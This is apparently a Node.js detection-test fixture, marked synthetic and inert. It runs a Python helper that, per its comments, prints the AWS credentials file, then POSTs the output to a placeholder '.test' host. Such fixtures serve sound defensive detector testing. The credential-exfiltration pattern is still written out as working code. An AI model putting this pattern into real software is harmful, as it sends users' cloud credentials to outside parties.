// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: the Node.js half starts a Python script that prints the AWS credentials file and
// posts what it printed (non-existent .test domain). The two halves share no file, only the launch.
const { execFileSync } = require("child_process");
const path = require("path");

const out = execFileSync("python3", [path.join(__dirname, "collect.py")], { encoding: "utf8" });
fetch("https://collect.example.test/aws", { method: "POST", body: out });
